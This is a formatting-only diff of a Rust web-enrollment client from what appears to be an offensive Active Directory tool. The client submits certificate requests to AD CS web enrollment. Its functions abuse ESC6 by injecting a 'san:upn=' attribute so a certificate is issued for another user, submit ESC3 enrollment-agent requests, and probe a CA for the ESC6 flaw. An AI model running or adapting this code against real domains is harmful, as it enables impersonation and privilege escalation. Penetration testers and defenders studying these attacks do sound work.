@@ -77,7 +77,7 @@ impl WebEnrollmentClient {
     // ─────────────────────────────────────────────────────────
 
     /// Submit a certificate request (CSR) to the CA
-    /// 
+    ///
     /// This is the main entry point for requesting certificates via Web Enrollment.
     /// Returns the raw response body containing the certificate or error.
     pub async fn submit_request(
@@ -86,7 +86,10 @@ impl WebEnrollmentClient {
         template: &str,
         attributes: Option<&[(&str, &str)]>,
     ) -> Result<CertificateResponse> {
-        info!("Submitting certificate request to {} for template {}", self.ca_server, template);
+        info!(
+            "Submitting certificate request to {} for template {}",
+            self.ca_server, template
+        );
 
         // Encode CSR to base64
         let csr_b64 = base64::engine::general_purpose::STANDARD.encode(csr_der);
@@ -111,10 +114,11 @@ impl WebEnrollmentClient {
 
         // Submit to certfnsh.asp
         let url = format!("{}/certfnsh.asp", self.base_url());
-        
+
         debug!("Submitting to: {}", url);
-        
-        let response = self.http_client
+
+        let response = self
+            .http_client
             .post(&url)
             .form(&form_data)
             .send()
@@ -144,8 +148,9 @@ impl WebEnrollmentClient {
         // Add SAN attribute for ESC6
         let san_str = format!("upn={}", san_value);
         let attributes: Vec<(&str, &str)> = vec![("san", &san_str)];
-        
-        self.submit_request(csr_der, template, Some(&attributes)).await
+
+        self.submit_request(csr_der, template, Some(&attributes))
+            .await
     }
 
     /// Submit a certificate request with enrollment agent certificate (for ESC3)
@@ -155,7 +160,10 @@ impl WebEnrollmentClient {
         template: &str,
         agent_cert_der: &[u8],
     ) -> Result<CertificateResponse> {
-        info!("Submitting agent-signed certificate request for template {}", template);
+        info!(
+            "Submitting agent-signed certificate request for template {}",
+            template
+        );
 
         // Encode CSR and agent certificate to base64
         let csr_b64 = base64::engine::general_purpose::STANDARD.encode(csr_der);
@@ -176,7 +184,8 @@ impl WebEnrollmentClient {
 
         debug!("Submitting agent-signed request to: {}", url);
 
-        let response = self.http_client
+        let response = self
+            .http_client
             .post(&url)
             .form(&form_data)
             .send()
@@ -195,7 +204,6 @@ impl WebEnrollmentClient {
         self.parse_response(&body, status)
     }
 
-
     /// Retrieve a pending certificate by request ID
     pub async fn retrieve_certificate(&self, request_id: u32) -> Result<Vec<u8>> {
         let url = format!(
@@ -206,17 +214,18 @@ impl WebEnrollmentClient {
 
         debug!("Retrieving certificate from: {}", url);
 
-        let response = self.http_client
-            .get(&url)
-            .send()
-            .await
-            .map_err(|e| OverthroneError::Connection {
-                target: url.clone(),
-                reason: format!("Certificate retrieval failed: {}", e),
-            })?;
+        let response =
+            self.http_client
+                .get(&url)
+                .send()
+                .await
+                .map_err(|e| OverthroneError::Connection {
+                    target: url.clone(),
+                    reason: format!("Certificate retrieval failed: {}", e),
+                })?;
 
         let body = response.text().await.unwrap_or_default();
-        
+
         // Remove PEM headers and decode
         let cert_b64 = body
             .lines()
@@ -237,12 +246,12 @@ impl WebEnrollmentClient {
     /// Parse the Web Enrollment response
     fn parse_response(&self, body: &str, status: StatusCode) -> Result<CertificateResponse> {
         // Check for various response patterns
-        
+
         // Success: certificate issued
         if body.contains("Certificate Issued") || body.contains("certnew.cer") {
             let request_id = self.extract_request_id(body)?;
             let cert_data = self.extract_certificate(body)?;
-            
+
             return Ok(CertificateResponse {
                 status: ResponseStatus::Issued,
                 request_id: Some(request_id),
@@ -254,7 +263,7 @@ impl WebEnrollmentClient {
         // Pending: requires manager approval
         if body.contains("Certificate Pending") || body.contains("pending") {
             let request_id = self.extract_request_id(body)?;
-            
+
             return Ok(CertificateResponse {
                 status: ResponseStatus::Pending,
                 request_id: Some(request_id),
@@ -266,7 +275,7 @@ impl WebEnrollmentClient {
         // Denied: request rejected
         if body.contains("Denied") || body.contains("rejected") {
             let error_msg = self.extract_error_message(body);
-            
+
             return Ok(CertificateResponse {
                 status: ResponseStatus::Denied,
                 request_id: None,
@@ -278,7 +287,7 @@ impl WebEnrollmentClient {
         // Error during processing
         if body.contains("Error") || body.contains("error") {
             let error_msg = self.extract_error_message(body);
-            
+
             return Ok(CertificateResponse {
                 status: ResponseStatus::Error,
                 request_id: None,
@@ -302,7 +311,10 @@ impl WebEnrollmentClient {
             status: ResponseStatus::Unknown,
             request_id: None,
             certificate: None,
-            message: format!("Unknown response: {}", body.chars().take(200).collect::<String>()),
+            message: format!(
+                "Unknown response: {}",
+                body.chars().take(200).collect::<String>()
+            ),
         })
     }
 
@@ -312,11 +324,8 @@ impl WebEnrollmentClient {
         for line in body.lines() {
             if line.contains("ReqID=") || line.contains("Request ID") {
                 // Try to extract number
-                let num: String = line
-                    .chars()
-                    .filter(|c| c.is_ascii_digit())
-                    .collect();
-                
+                let num: String = line.chars().filter(|c| c.is_ascii_digit()).collect();
+
                 if let Ok(id) = num.parse::<u32>() {
                     return Ok(id);
                 }
@@ -351,7 +360,9 @@ impl WebEnrollmentClient {
             let cert_b64 = cert_lines.join("");
             return base64::engine::general_purpose::STANDARD
                 .decode(&cert_b64)
-                .map_err(|e| OverthroneError::Decryption(format!("Certificate decode failed: {}", e)));
+                .map_err(|e| {
+                    OverthroneError::Decryption(format!("Certificate decode failed: {}", e))
+                });
         }
 
         // Try to extract from raw base64 in response
@@ -362,17 +373,18 @@ impl WebEnrollmentClient {
                 && trimmed
                     .chars()
                     .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
-                && let Ok(decoded) =
-                    base64::engine::general_purpose::STANDARD.decode(trimmed)
-                {
-                    // Check if it looks like a certificate (starts with SEQUENCE tag)
-                    if !decoded.is_empty() && decoded[0] == 0x30 {
-                        return Ok(decoded);
-                    }
+                && let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(trimmed)
+            {
+                // Check if it looks like a certificate (starts with SEQUENCE tag)
+                if !decoded.is_empty() && decoded[0] == 0x30 {
+                    return Ok(decoded);
                 }
+            }
         }
 
-        Err(OverthroneError::Adcs("Could not extract certificate from response".to_string()))
+        Err(OverthroneError::Adcs(
+            "Could not extract certificate from response".to_string(),
+        ))
     }
 
     /// Extract error message from response
@@ -405,13 +417,10 @@ impl WebEnrollmentClient {
     /// Check if Web Enrollment is available
     pub async fn check_availability(&self) -> Result<bool> {
         let url = format!("{}/default.asp", self.base_url());
-        
+
         debug!("Checking availability: {}", url);
 
-        let response = self.http_client
-            .get(&url)
-            .send()
-            .await;
+        let response = self.http_client.get(&url).send().await;
 
         match response {
             Ok(resp) => {
@@ -427,26 +436,25 @@ impl WebEnrollmentClient {
     }
 
     /// Check if ESC6 is possible (EDITF_ATTRIBUTESUBJECTALTNAME2)
-    /// 
+    ///
     /// This checks if the CA accepts the san attribute in the request.
     pub async fn check_esc6_vulnerable(&self) -> Result<bool> {
         // Create a test request with SAN attribute
         // If accepted (even with error), the flag might be set
         let test_csr = base64::engine::general_purpose::STANDARD.encode(b"test");
-        
+
         let url = format!("{}/certfnsh.asp", self.base_url());
-        
+
         let form_data = [
             ("Mode", "newreq".to_string()),
             ("CertRequest", test_csr),
-            ("CertAttrib", "CertificateTemplate:User\nsan:upn=test@test.com".to_string()),
+            (
+                "CertAttrib",
+                "CertificateTemplate:User\nsan:upn=test@test.com".to_string(),
+            ),
         ];
 
-        let response = self.http_client
-            .post(&url)
-            .form(&form_data)
-            .send()
-            .await;
+        let response = self.http_client.post(&url).form(&form_data).send().await;
 
         match response {
             Ok(resp) => {
@@ -462,18 +470,19 @@ impl WebEnrollmentClient {
     /// Get CA information
     pub async fn get_ca_info(&self) -> Result<CaInfo> {
         let url = format!("{}/certrqus.asp", self.base_url());
-        
-        let response = self.http_client
-            .get(&url)
-            .send()
-            .await
-            .map_err(|e| OverthroneError::Connection {
-                target: url.clone(),
-                reason: format!("CA info request failed: {}", e),
-            })?;
+
+        let response =
+            self.http_client
+                .get(&url)
+                .send()
+                .await
+                .map_err(|e| OverthroneError::Connection {
+                    target: url.clone(),
+                    reason: format!("CA info request failed: {}", e),
+                })?;
 
         let body = response.text().await.unwrap_or_default();
-        
+
         // Extract CA name and available templates
         let ca_name = self.extract_ca_name(&body);
         let templates = self.extract_templates(&body);
@@ -502,19 +511,21 @@ impl WebEnrollmentClient {
 
     fn extract_templates(&self, body: &str) -> Vec<String> {
         let mut templates = Vec::new();
-        
+
         // Look for template dropdown options
         for line in body.lines() {
-            if line.contains("<option") && line.contains("value=")
-                && let Some(start_pos) = line.find("value=\"") {
-                    let start = start_pos + 7;
-                    if let Some(end) = line[start..].find('"') {
-                        let template = &line[start..start + end];
-                        if !template.is_empty() {
-                            templates.push(template.to_string());
-                        }
+            if line.contains("<option")
+                && line.contains("value=")
+                && let Some(start_pos) = line.find("value=\"")
+            {
+                let start = start_pos + 7;
+                if let Some(end) = line[start..].find('"') {
+                    let template = &line[start..start + end];
+                    if !template.is_empty() {
+                        templates.push(template.to_string());
                     }
                 }
+            }
         }
 
         // Add common templates if none found
